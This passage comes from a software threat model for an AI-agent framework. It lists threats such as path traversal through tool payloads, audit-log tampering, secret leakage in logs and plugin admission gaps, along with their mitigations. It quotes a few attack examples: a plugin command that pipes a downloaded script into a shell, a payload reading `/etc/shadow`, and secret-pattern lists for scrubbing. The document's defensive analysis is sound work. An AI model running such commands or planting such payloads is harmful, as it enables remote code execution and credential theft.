  2. `_parse_tool_id` parses `("openscad", "render_single")` (`backend.py:163-171`).
  3. Allowlist check passes (the tool *name* is on the allowlist).
  4. `session.call_tool("render_single", payload)` — payload travels over MCP to the OpenSCAD subprocess, which dutifully reads `/etc/shadow` as an OpenSCAD source.
- **Impact:** **High** — information disclosure on host filesystem (depends on what the MCP server is willing to read); `freecad-mcp`'s `get_object` and `get_view` would return geometry of arbitrary FreeCAD documents under the host user's reach.
- **Likelihood:** **Medium** — Claude generations are by-default-helpful and may produce paths; adapter authors are responsible per `SECURITY.md` §"Hardening Expectations" item 1, but the boundary delegation is the threat.
- **Risk:** **High**. Defended: the policy promise (ADR-0016 §5: "**MUST reject** path-traversal") is at the `ToolBackend`, the implementation places the burden at every adapter; trichotomy gap.
- **Classification:** policy-only at the `ToolBackend`; partially-enforced inside individual adapters via `vigor_core.util.safe_relative` per `SECURITY.md`.
- **Mitigation:** **Preventive.** Either (a) require every `MCPServerSpec` declaring a path-touching tool to also declare an `archive_root_required: list[str]` of payload-key names that the backend will validate via `RunArchive._safe_target`-style containment, or (b) lift the responsibility into the adapter base class via a `validate_path_arg` helper. (a) preserves the ADR-0016 promise; (b) honours the existing per-adapter pattern. Sibling: **VIGOR-a29a-MIT-T6**.

### T7 — Audit-log absence: tool calls, tenant identity, hash chain

- **Component:** Orchestrator + RunArchive
- **Code anchor:** `packages/vigor-core/src/vigor_core/schemas.py:280` — `ProvenanceActivity.type: Literal["generation", "compile", "review", "adjudication", "patch", "export"]`. No `"tool_call"` value. No `tenant_id` anywhere. No hash chain.
- **Actor:** Insider with read-write access to `{archive_dir}/{run_id}/` — DevOps, fellow tenant in a shared volume, an LFI on a mis-configured webserver.
- **Vector:**
  1. After a sensitive run, attacker edits `provenance.json` to remove a `ProvenanceActivity` corresponding to a regrettable generation, OR rewrites a `ReviewReport.summary` to remove evidence of a leak.
  2. There is no chained `prev_event_sha256` (per 2026 norm in scout §III.E); detection requires the operator to have a separate (not-on-disk) baseline hash.
  3. The provenance record is therefore *evidence with no integrity guarantee*.
- **Impact:** **High** — destroys the only post-hoc reproducibility mechanism; for compliance use cases (medical, legal, financial) is fatal.
- **Likelihood:** **Low-Medium** — requires FS write access; in shared-tenant deployments this is on the high side.
- **Risk:** **Medium-High**. Defended: provenance is the entire purpose of the framework's verifiability claim (ADR-0011 IR contract); a malleable provenance file is a load-bearing-on-trust failure.
- **Classification:** unimplemented (3 distinct gaps: tool-call events, tenant id, hash chain; plus PII redaction is policy-only via `SECURITY.md`).
- **Mitigation:** **Preventive + Detective.** New `vigor.audit_event.v1` schema sibling to `vigor.provenance.v1`, written by the orchestrator at every adapter/backend/tool boundary, with `prev_event_sha256` chaining; PII scrubbing via Pydantic `SecretStr` adoption (§T9); retention policy declared per-deployment. Sibling: **VIGOR-a29a-MIT-T7**.

### T8 — Plugin-server admission gap (ADR-0017 follow-up not yet implemented)

- **Component:** AgentOrchestrator + plugin discovery
- **Code anchor:** ADR-0017 §"Follow-ups required before this ADR moves from `proposed` to `accepted`" item 2. `vigor-core/agent_config.py` has `allowed_plugin_factory_prefixes` (host gate for code factories) but no `plugin_allowed_mcp_servers` (host gate for MCP-server identities discovered from plugin manifests).
- **Actor:** Plugin author publishing an OPS v1 pure-MCP plugin with a `mcpServers` block.
- **Vector:**
  1. Operator points `vigor-agent` at a plugin directory containing a pure-MCP plugin.
  2. ADR-0017 chosen path admits the plugin's `mcpServers` as ambient tool sources (`mcp_servers_from_plugin`) — *if implemented*. Today the implementation does not exist; the threat is what happens *when it lands without the host gate*.
  3. Plugin's `mcpServers` block declares `command=["sh", "-c", "curl … | sh"]`. Without `plugin_allowed_mcp_servers`, the host accepts the spec and at first tool call spawns the shell pipeline.
- **Impact:** **Critical** — RCE via plugin distribution channel.
- **Likelihood:** **Low** today (the code path is not yet there); **High** the moment ADR-0017 ships without the host-gate prerequisite. The threat is therefore a *sequencing* threat: it warns against landing the discovery code before the gate.
- **Risk:** **Critical-conditional** (i.e. high if the prerequisite is skipped, mitigated to low if observed). The ADR itself is explicit on this — promotion to `accepted` is gated on the host-gate landing first.
- **Classification:** policy-only (the ADR commits to the gate; no code yet).
- **Mitigation:** **Preventive.** Implement `AgentConfig.plugin_allowed_mcp_servers` mirroring `allowed_plugin_factory_prefixes`; refuse to merge plugin-discovered specs into `cfg.mcp_servers` unless every spec's `server_id` (or `command[0]` for stdio) is on the host allowlist. Land *before* the discovery code path that ADR-0017 sketches at "Implementation sketch". Sibling: **VIGOR-a29a-MIT-T8**.

### T9 — Secret-bearing config fields survive `model_dump_json`

- **Component:** AgentConfig loader
- **Code anchor:** `packages/vigor-core/src/vigor_core/agent_config.py:53-69` (`MCPServerSpec.env`, `.headers`); `packages/vigor-backend-claude-agent-sdk/src/vigor_backend_claude_agent_sdk/backend.py:51-53` (`ClaudeBackendConfig.env`).
- **Actor:** Anyone who triggers a debug log path that calls `repr(config)` or `model_dump_json` — error handlers, structured logging, error-aggregation services.
- **Vector:**
  1. Operator runs `vigor-agent run --config x.yaml task.json` with a misconfigured factory.
  2. Configuration construction raises; the CLI's error path includes `f"AgentConfig: {cfg.model_dump_json(indent=2)}"` — secrets in `headers["Authorization"]` and `env["ANTHROPIC_API_KEY"]` appear in stdout/stderr.
  3. CI logs ingest stderr; logs are retained for 30 d by GitHub Actions; secrets are now in a third-party retention store.
- **Impact:** **High** — secret exposure with persistence.
- **Likelihood:** **Medium** — depends on whether any code path actually serialises the config. Repo grep finds no `model_dump_json` of `AgentConfig` today, but the Pydantic capability exists and is one logging-line away.
- **Risk:** **Medium-High**. Defended: a secret container that stringifies plaintext is a perennial OWASP A07/A09 issue; the absence of `SecretStr` is the structural smell.
- **Classification:** unimplemented.
- **Mitigation:** **Preventive.** Adopt `pydantic.SecretStr` for `MCPServerSpec.env` values, `MCPServerSpec.headers` values, and `ClaudeBackendConfig.env` values. Add a `redact()` pass on `model_dump_json`. Sibling: **VIGOR-a29a-MIT-T9**.

### T10 — `ResourceWarning` suppression masks subprocess leak detection

- **Component:** test suite (cross-cutting); deployment-ready signal
- **Code anchor:** `pyproject.toml:51` (filterwarnings list ignores `ResourceWarning`).
- **Actor:** Anyone shipping a regression that leaks an MCP subprocess; the test suite passes silently.
- **Vector:**
  1. Refactor changes `_ServerHandle.aclose` so the `AsyncExitStack` is rebuilt without first closing the prior stack.
  2. Subprocesses leak from one test to the next; `pytest` would emit `ResourceWarning: subprocess <pid> was not closed` — but the warning is filtered.
  3. Tests pass green. Hosted deployment surfaces leaks as VRAM exhaustion / port exhaustion / fd exhaustion days later.
- **Impact:** **Medium** — Availability impact in production; diagnostic blindness in CI.
- **Likelihood:** **Medium** — the existing teardown logic at `backend.py:87-91, 144-149` has been reviewed (mulch `mx-463e2b`) but every refactor risks regressing it.
- **Risk:** **Medium**. Defended: the suppression is repo-wide; it removes a leading indicator that no replacement signal substitutes for.
- **Classification:** observational (per scout report) → **partially-enforced** (the suppression is intentional config; the *consequence* is what the threat names).
- **Mitigation:** **Detective.** Lift the suppression at least for the `vigor-mcp` test package (`tool.pytest.ini_options` per-path overrides), or replace with an explicit pytest plugin that asserts subprocess count zero at session end. Sibling: **VIGOR-a29a-MIT-T10**.

### T11 — Generic `Exception` handler in run loop swallows secret-shaped messages

- **Component:** Orchestrator
- **Code anchor:** `packages/vigor-runtime/src/vigor_runtime/orchestrator.py:202-211` — `RuntimeErrorRecord(message=f"{type(exc).__name__}: {exc}")`. No filtering.
- **Actor:** Adapter or backend code that raises an exception whose `args` carry a path, URL with credentials, or env-token.
- **Vector:**
  1. An adapter calls `requests.get(f"https://api/?key={api_key}")` and gets a `ConnectionError` whose `args[0]` includes the URL-with-token.
  2. The exception propagates to the run-loop. The handler stuffs `f"requests.ConnectionError: HTTPSConnectionPool(host='api', port=443): … key=sk-abc123"` into `RuntimeErrorRecord.message`.
  3. `RunArchive.write_error` writes it to `{archive_dir}/{run_id}/errors/err_*.json`.
- **Impact:** **Medium-High** — secret persistence on disk; same shape as T9 but with no operator action required to trigger it.
- **Likelihood:** **Medium** — depends on adapter exception hygiene. CAD/photo adapters that wrap subprocesses are the most exposed.
- **Risk:** **Medium**. Defended: the orchestrator owns the disk write; *it* is the right place to scrub before persist, even if the underlying adapter is sloppy.
- **Classification:** unimplemented.
- **Mitigation:** **Detective.** PII-scrubbing pass on `RuntimeErrorRecord.message` before `write_error`; pattern set: `Authorization: Bearer …`, `key=`, `password=`, `https://[^/]*:[^@]*@`, env-shaped tokens. Sibling: **VIGOR-a29a-MIT-T11**.

### T12 — No tenant identity ⇒ archive cross-contamination, audit ambiguity

- **Component:** AgentOrchestrator + RunArchive + ProvenanceRecord
- **Code anchor:** No `tenant_id` field anywhere in `vigor-core/schemas.py` or `vigor-core/agent_config.py`. `RunArchive.run_dir(run_id)` (`archive.py:49-50`) only namespaces by `run_id`.
- **Actor:** Hosted operator running multiple tenants in one process.
- **Vector:**
  1. Tenant A's `run_id="job_42"` writes under `{archive_dir}/job_42/`.
  2. Tenant B happens to choose the same `run_id` (operator-controlled string, no namespace). Files collide.
  3. Even without collision, audit logs cannot answer "which tenant ran this?" because nothing records it.
- **Impact:** **High** in multi-tenant; **Low** in single-tenant.
- **Likelihood:** **High** in multi-tenant if `RunResult.run_id` is operator-controlled; **Low** in current single-tenant deployments.
- **Risk:** **Medium** today; the assumption from §1.2 is single-tenant. Risk **escalates to High** the moment hosted multi-tenant ships without this addressed.
- **Classification:** unimplemented.
- **Mitigation:** **Preventive.** Add `tenant_id` to `TaskSpec` and `ProvenanceRecord`; namespace `RunArchive` paths as `{archive_dir}/{tenant_id}/{run_id}/`; refuse runs with unknown tenant. Sibling: **VIGOR-a29a-MIT-T12**.

### T13 — No rate limit, no circuit breaker, no per-server failure tracking

- **Component:** MCPToolBackend (both paths)
- **Code anchor:** `packages/vigor-mcp/src/vigor_mcp/backend.py:122-157` — `call_tool` does the timeout, returns the result, and forgets. No `_failure_window`, no `_consecutive_failures`.
- **Actor:** Vendor outage (Anthropic 5xx, Gemini quota exceeded, GLM PRC connectivity), or a cooperating MCP server that returns failure-shaped results to drive cost up.
- **Vector:**
  1. Vendor degrades: every `call_tool` returns `status="failure"` after 90 s.
  2. The orchestrator's iteration loop sees the reviewer outputs as failed; depending on adjudication policy it may proceed to `propose_patch` or escalate.
  3. With patch decision: each iteration retries the broken upstream, burning wall-clock and tokens. T2 ensures cost ceiling does not stop it. Total cost = `max_iterations × max_candidates × per-call`.
- **Impact:** **Medium** — Availability impact and (in conjunction with T2) cost impact; not a confidentiality breach.
- **Likelihood:** **Medium-High** — vendor outages are common; PRC providers under `luma-mcp` are flagged as flakier in ADR-0016 §"Negative consequences" item 1.
- **Risk:** **Medium**. Defended: the timeout fires per-call, but no aggregate failure signal halts the loop early.
- **Classification:** unimplemented (the `ToolManifest.retry_policy` dict — `schemas.py:84` — is the natural home but is unused).
- **Mitigation:** **Corrective.** Per-server consecutive-failure counter inside `_ServerHandle`; configurable `circuit_open_threshold` on `MCPServerSpec`. Combine with T2's `max_cost_usd` enforcement so a circuit-open server cannot drive cost. Sibling: **VIGOR-a29a-MIT-T13**.

### T14 — IR validation gap on backend-supplied generations

- **Component:** Orchestrator
- **Code anchor:** `packages/vigor-runtime/src/vigor_runtime/orchestrator.py:283-303` — `validate_ir` runs at evaluate time. The gap: between `_candidate_batch` (line 252-275) which calls `backend.generate(...)` and the evaluate-time validate at 283, the backend-supplied IR is *appended to `prior` and `generated`* without re-validation. ArtifactIR's pydantic constructor validates schema-shape but does not run `adapter.validate_ir`.
- **Actor:** Backend (Claude SDK) producing a structurally-valid but semantically-broken `ArtifactIR.body`.
- **Vector:**
  1. Backend returns IR whose body fails `adapter.validate_ir` (e.g. CAD geometry referencing a non-existent body).
  2. `_candidate_batch` returns it; the next iteration's `_evaluate_candidate` runs `validate_ir` and fails the candidate.
  3. The candidate is still on `prior` (`orchestrator.py:127`). Subsequent generations are seeded with it.
- **Impact:** **Low-Medium** — integrity-of-process; the broken candidate poisons the prior set, but the loop will adjudicate it as `fail`.
- **Likelihood:** **Medium** — hallucinated IRs are routine for LLM backends.
- **Risk:** **Low-Medium**. Defended: `prior` is only an input to subsequent `backend.generate(...)` requests; the broken candidate is never *written* downstream as accepted.
- **Classification:** partially-enforced (validation exists but at one boundary, not at all).
- **Mitigation:** **Preventive.** Hoist `validate_ir` into `_candidate_batch` before appending to `generated`. Sibling: **VIGOR-a29a-MIT-T14**.

### T15 — Network isolation for unauthenticated MCP servers is policy-only

- **Component:** MCPToolBackend stdio + http transport selection
- **Code anchor:** ADR-0016 §"Network isolation": "Servers without auth … MUST be local-only. The `neka-nat` XML-RPC bridge MUST bind to `127.0.0.1`; opening it to a network interface is forbidden." `packages/vigor-mcp/src/vigor_mcp/transports/sdk.py` does not enforce loopback for `transport="http"` URLs.
- **Actor:** Operator misconfiguration: declares `MCPServerSpec(transport="http", url="http://internal-mcp.lan:9000/sse")` for a server that has no auth.
- **Vector:**
  1. The `MCPServerSpec` validator (`agent_config.py:71-89`) checks transport-specific field combinations but not URL hostname.
  2. The MCP SDK opens a streamable-HTTP session against `internal-mcp.lan`. The server has no auth; anyone on the LAN can poke it.
  3. From VIGOR's perspective, the server is now a third-party with full access to whatever the agent dispatches.
- **Impact:** **Medium-High** — depends on what tools the unauthenticated server exposes. For `quellant/openscad-mcp` (file-touching) it is High.
- **Likelihood:** **Low-Medium** — requires deliberate operator misconfig, but `transport="http"` is exactly the path ADR-0016 reserves for hosted/GPU services where auth is presumed; the policy gap is *no validation*.
- **Risk:** **Medium**. Defended: ADR-0016 §6 is unambiguous; the schema validator does not check it.
- **Classification:** policy-only.
- **Mitigation:** **Preventive.** Add a model_validator on `MCPServerSpec` that, when `transport in ("http","sse")` and `headers` is empty (i.e. no Authorization), refuses non-loopback URLs. Sibling: **VIGOR-a29a-MIT-T15**.

### T16 — Reviewer free-text persisted verbatim ⇒ PII / secret exposure on disk

- **Component:** RunArchive (write_review)
- **Code anchor:** `packages/vigor-core/src/vigor_core/archive.py:95-102`. `ReviewReport.summary` is a free-text field; `ReviewReport.findings[*].evidence` is also free-text.
- **Actor:** Backend reviewer (Claude SDK) returning verbatim user prompt / reference content in its critique, where the user prompt may carry personal data, API keys, or other secrets.
- **Vector:**
  1. Operator's `TaskSpec.goal` includes a payment ID or email for context.
  2. Backend reviewer summarises: `"Image fails the criterion in goal '… email user@example.com'"`.
  3. `RunArchive.write_review` writes the summary to disk under `{archive_dir}/{run_id}/candidates/{cand}/reviews/{rev}.json`.
  4. PII / secrets persist with no rotation, no scrubbing, no retention policy.
- **Impact:** **High** for PII; for secrets, depends on the underlying secret type.
- **Likelihood:** **Medium** — depends on what tenants put into `TaskSpec.goal` and `references`. For the manim/photo demo tasks it is benign; for hypothetical hosted use cases (medical imaging captioning, contract diagram review) it is High.
- **Risk:** **Medium-High**. Defended: see T7 — the absence of audit-log PII scrubbing infrastructure means *every* on-disk record is a potential disclosure vector.
- **Classification:** unimplemented.
- **Mitigation:** **Preventive + Detective.** Run a redaction pass on `ReviewReport.summary` and `Finding.evidence` before persist; scrubber lives in `vigor-core/util.py` so adapters share it; declare retention policy per deployment. Sibling: **VIGOR-a29a-MIT-T16**.

---

## 6. Prioritised Mitigations

Sorted by Risk descending. Classification is the threat-prioritisation tier (P0 = ship-stopper for a hosted product; P1 = should-precede-`Accepted`-status on the relevant ADR; P2 = single-tenant-tolerable, multi-tenant-required).

| Threat ID | Mitigation (one-liner) | Classification | Implementation Seam (file:line) | Sibling Seeds id |
|---|---|---|---|---|
| **T1** | Default-deny env on stdio MCP subprocesses (`PATH`-only inherit) | **P0** | `vigor-mcp/transports/sdk.py:43` | TBD (VIGOR-a29a) |
| **T2** | Wire `Budgets.max_cost_usd` via `AgentBackend.usage()` + `RunBudgetTracker` + new `StopReason="cost_exceeded"` | **P0** | `vigor-runtime/orchestrator.py:114-118`; `vigor-core/schemas.py:51-58, 120-127`; `vigor-backend-claude-agent-sdk/backend.py:92-95` | TBD |
| **T4** | Enforce `ToolManifest.mutability` via `RunContext.tool_capabilities` gate in `MCPToolBackend.call_tool` | **P0** | `vigor-mcp/backend.py:122-157`; `vigor-core/schemas.py:80`; `vigor-core/interfaces.py` (RunContext) | TBD |
| **T8** | `AgentConfig.plugin_allowed_mcp_servers` host gate before any ADR-0017 discovery code path lands | **P0-conditional** | `vigor-core/agent_config.py:118-138` | TBD |
| **T6** | Path-traversal containment at `MCPToolBackend` boundary (per-spec `archive_root_required`) OR adapter-base helper | **P1** | `vigor-mcp/backend.py:122-157` | TBD |
| **T7** | `vigor.audit_event.v1` schema with hash chain + tool-call events + `tenant_id` | **P1** | new schema in `vigor-core/schemas.py`; emit point: `vigor-runtime/orchestrator.py` (every adapter/backend/tool boundary) | TBD |
| **T12** | Add `tenant_id` to `TaskSpec`, `ProvenanceRecord`; namespace `RunArchive` by tenant | **P1** | `vigor-core/schemas.py:61-72, 287-298`; `vigor-core/archive.py:49-50` | TBD |
| **T15** | Validator: refuse `transport in ("http","sse")` with empty `headers` against non-loopback `url` | **P1** | `vigor-core/agent_config.py:71-89` | TBD |
| **T9** | Adopt `pydantic.SecretStr` for `MCPServerSpec.env`, `.headers`, `ClaudeBackendConfig.env` | **P1** | `vigor-core/agent_config.py:53-69`; `vigor-backend-claude-agent-sdk/backend.py:51-53` | TBD |
| **T11** | PII-scrubber on `RuntimeErrorRecord.message` before `write_error` | **P1** | `vigor-runtime/orchestrator.py:202-211`; new helper in `vigor-core/util.py` | TBD |
| **T16** | Redaction pass on `ReviewReport.summary` + `Finding.evidence` before persist | **P1** | `vigor-core/archive.py:95-102` | TBD |
| **T3** | Either wire `max_tool_retries` into a real retry loop, or remove `retryable` from schemas | **P2** | `vigor-mcp/backend.py:122-157`; `vigor-runtime/orchestrator.py:537-558`; `vigor-core/schemas.py:140-161`; `vigor-core/errors.py` | TBD |
| **T5** | Post-import `__file__` check against expected path-prefix; document `sys.path` hygiene in SECURITY.md | **P2** | `vigor-agent/factory.py`; `SECURITY.md` | TBD |
| **T13** | Per-server consecutive-failure counter + `circuit_open_threshold` on `MCPServerSpec` | **P2** | `vigor-mcp/backend.py:37-92`; `vigor-core/agent_config.py:53-69` | TBD |
| **T10** | Lift `ResourceWarning` suppression for the `vigor-mcp` test package | **P2** | `pyproject.toml:51` | TBD |
| **T14** | Hoist `validate_ir` into `_candidate_batch` before appending to `generated` | **P2** | `vigor-runtime/orchestrator.py:252-275` | TBD |

`TBD` reflects that mitigation seed creation is sibling **VIGOR-a29a**'s job per the parent task spec; this TM names the threats and seams, not the seeds.

### 6.1 Why these P0s?

- **T1** is the single most asymmetric risk in the list: the *default behaviour* is leak, the fix is two characters of config plumbing, and it gates every secret in the host process.
- **T2** turns a paper budget into a real one. Without it, hosted multi-tenant cannot ship any pricing.
- **T4** is the keystone of ADR-0016's authorisation story. With it, mutator surface area is observable and auditable; without it, the schema field is decorative.
- **T8** is conditional but ship-stopping for ADR-0017's promotion path; it is on this list to ensure the sequencing is observed.

### 6.2 Why these P1s and not P0s?

P1 items are required before a hosted multi-tenant deployment, but a single-tenant CLI / library deployment (the documented current shape per `README.md`) tolerates them. The trichotomy in §0 is doing the prioritisation work: P0 means "policy is broken in the current deployment shape"; P1 means "policy is broken in the near-target deployment shape".

### 6.3 Why these P2s?

P2 items are integrity / drift threats that are uncomfortable but not actively exploitable today: T3 is a misleading API surface; T5 requires admin-equivalent prerequisites; T13 manifests as cost (already on T2's mitigation path); T10 is a leading-indicator suppression; T14 is a soft poisoning of the `prior` set.

---

## 7. Out Of Scope

This threat model **does not** cover:

1. **Physical infrastructure.** Disk encryption at rest, BIOS measurement, hardware HSMs, data-centre physical access. Out of scope per VIGOR's library-first posture.
2. **CI build pipeline beyond the existing `gh-actions` posture.** The repo's `ci.yml` and `skill-drift.yml` are the only workflows; a future container-build / SBOM / signing pipeline is part of VIGOR-c1ab's strategic deep-dive (sibling `VIGOR-ef9a`), not this TM. ADR-0016 §"Implementation Notes" item 4 reserves space for `mcp-smoke.yml` but it does not yet exist.
3. **Denial of service from the LLM provider side.** Vendor rate limits, vendor outage modes, vendor key revocation are upstream behaviours; T13 covers VIGOR's *response* to vendor failure but not the vendor failure itself.
4. **Side-channel attacks on the host process** (timing, memory, cache). VIGOR is a Python long-running process with garbage collection; standard side-channel attack surface, no specific mitigation worth specifying.
5. **Compromise of the operator's `AgentConfig` file.** If an attacker can rewrite the config, they can rewrite the allowlist; this is admin-equivalent compromise and is treated as outside the model per §1.2 assumption 3.
6. **Compromise of the Claude Agent SDK itself.** The SDK is a vendor binary; supply-chain compromise of `claude-agent-sdk` is bounded by the operator's pinning policy in `pyproject.toml`.
7. **Cross-modal task composition vulnerabilities.** ADR-0014's "Cross-modal task composition" is explicitly deferred (one task → one adapter, today); attack surface for composition does not exist yet.
8. **AIECF integration.** Per ADR-0016 §"Officially supported servers" footnote, AIECF is Phase D and gated on external repo access; threat-modelling it now is speculation.
9. **Container sandbox posture.** `docs/readiness/implementation-readiness.md` row C10 names container sandbox as future hardening. Threats that the container would mitigate are folded into the trust-boundary analysis here; the *container itself* is not modelled.
10. **Compliance frameworks** (SOC 2, HIPAA, PCI-DSS, GDPR Article 17 erasure). Different tool; this TM names the technical threats that *block* compliance posture (e.g. T7 audit log absence blocks SOC 2 CC7) but does not author the compliance map.

---

## 8. Review Cadence

This TM is a **draft**; promotion to "Accepted" is gated on:

1. Sibling `VIGOR-a29a` creating the mitigation backlog and replacing the `TBD` Seeds-ids in §6.
2. The `lead-deployment-strategy-v2` synthesis selecting which of {T1, T2, T4, T8} ship before the next vigor-runtime minor.
3. ADR-0017's promotion-to-`Accepted` blockers (T8 + VIGOR-8bdf) being settled.

Cadence after promotion:

- **Annually**, or
- **On material architecture change** — any new top-level component in §4, any new transport in `transports/sdk.py`, any change to the trust boundaries in §3, any new ADR that touches authentication / authorisation / audit, OR
- **Post-incident** — if any of the named threats fires in production.

The `Date` line at the top of this document is the current revision marker. A successor TM revises by updating in place rather than spawning a new file (consistent with VIGOR ADR house style — mulch `mx-1946e5`).

---

## 9. References

### 9.1 Internal documents

- **`SECURITY.md`** — current security policy (path containment, untrusted-input handling, supply-chain hygiene).
- **`docs/adr/0014-generalized-agent-config.md`** — `AgentConfig`, factory allowlist, plugin-prefix gate.
- **`docs/adr/0016-official-mcp-servers.md`** — MCP transport policy, allowlist discipline, mutator-capability rule, vendor auth & rotation.
- **`docs/adr/0017-pure-mcp-plugin-support.md`** — pure-MCP plugins as ambient tool sources; `plugin_allowed_mcp_servers` follow-up requirement.
- **`docs/research/2026-mcp-reviewer-survey.md`** — external MCP server survey (cutoff 2026-05-14).
- **`docs/readiness/implementation-readiness.md`** — phase status; row C10 ("container sandbox future hardening").
- **`.overstory/specs/VIGOR-4293.md`** — deployment scout report; primary source for every named gap in §5.
- **`.overstory/specs/VIGOR-f44c.md`** — this builder's task spec.

### 9.2 Code anchors (canonical paths used in this document)

- `packages/vigor-runtime/src/vigor_runtime/orchestrator.py` — `Orchestrator.run`, `_safe_compile`, `_safe_export`, `_run_reviewers`, `_reviewer_error_report`, run-loop `Exception` handler.
- `packages/vigor-mcp/src/vigor_mcp/backend.py` — `MCPToolBackend.call_tool`, `_ServerHandle`, allowlist + timeout enforcement.
- `packages/vigor-mcp/src/vigor_mcp/transports/sdk.py` — `open_session` for stdio / sse / http; subprocess-env construction.
- `packages/vigor-core/src/vigor_core/archive.py` — `RunArchive`, `_safe_target` containment, write methods.
- `packages/vigor-core/src/vigor_core/agent_config.py` — `AgentConfig`, `MCPServerSpec`, `FactoryRef`, `assert_factory_ref_allowed`.
- `packages/vigor-core/src/vigor_core/schemas.py` — `Budgets`, `ToolManifest.mutability`, `RuntimeErrorRecord`, `ProvenanceRecord` / `ProvenanceActivity`, `StopReason`.
- `packages/vigor-core/src/vigor_core/interfaces.py` — `AgentBackend` (incl. `aclose`), `ToolBackend` (incl. `aclose`), `RunContext`.
- `packages/vigor-agent/src/vigor_agent/agent.py` — `AgentOrchestrator`, `_build_backend`, `_build_tool_backend`.
- `packages/vigor-backend-claude-agent-sdk/src/vigor_backend_claude_agent_sdk/backend.py` — `ClaudeAgentBackend`, `ClaudeBackendConfig`.
- `pyproject.toml:49-55` — `filterwarnings`, custom pytest markers.

### 9.3 Mulch decisions and patterns referenced

- **`mx-c4ce9a` (vigor-mcp, foundational)** — dotted-component matching for module-name allowlists; `assert_factory_ref_allowed` honours this.
- **`mx-bf232e` (vigor-mcp, foundational)** — MCP transport split (stdio default for local; http/sse for hosted/GPU). Underpins T15.
- **`mx-463e2b` (vigor-mcp, foundational)** — `wait-for` timeout rolls back MCP handle. Underpins the matrix's enforcement claim for MCPToolBackend §4.3 D.
- **`mx-706d56` (vigor-mcp, foundational)** — `tool_allowlist` materialises to a `frozenset` for O(1) checks. Underpins matrix §4.3 E denial-of-non-allowlisted-tools.
- **`mx-21b84c` (vigor-mcp, foundational)** — `asyncio.wait_for` timeout cancels the inner task without rolling back state in the abstract; the existing `aclose()` codepath (§4.3 D) is the workaround.
- **`mx-27830f` (vigor-mcp, tactical)** — ADR-0017 pure-MCP plugins as ambient tool sources; underpins T8.
- **`mx-1946e5` (adr, foundational)** — VIGOR ADR house style; this TM follows the same `Status / Date / Scope / Body / References` shape.

### 9.4 External 2026 references

- **Microsoft STRIDE** — https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
- **OWASP Threat Modeling** — https://owasp.org/www-community/Threat_Modeling
- **MCP Python SDK** — https://github.com/modelcontextprotocol/python-sdk
- **Open Plugin Specification v1** — https://github.com/vercel-labs/open-plugin-spec (PR #3 still open as of 2026-05-04 per ADR-0017)
- **Anthropic Building Effective Agents** — https://www.anthropic.com/engineering/building-effective-agents

---

<!-- end of file -->
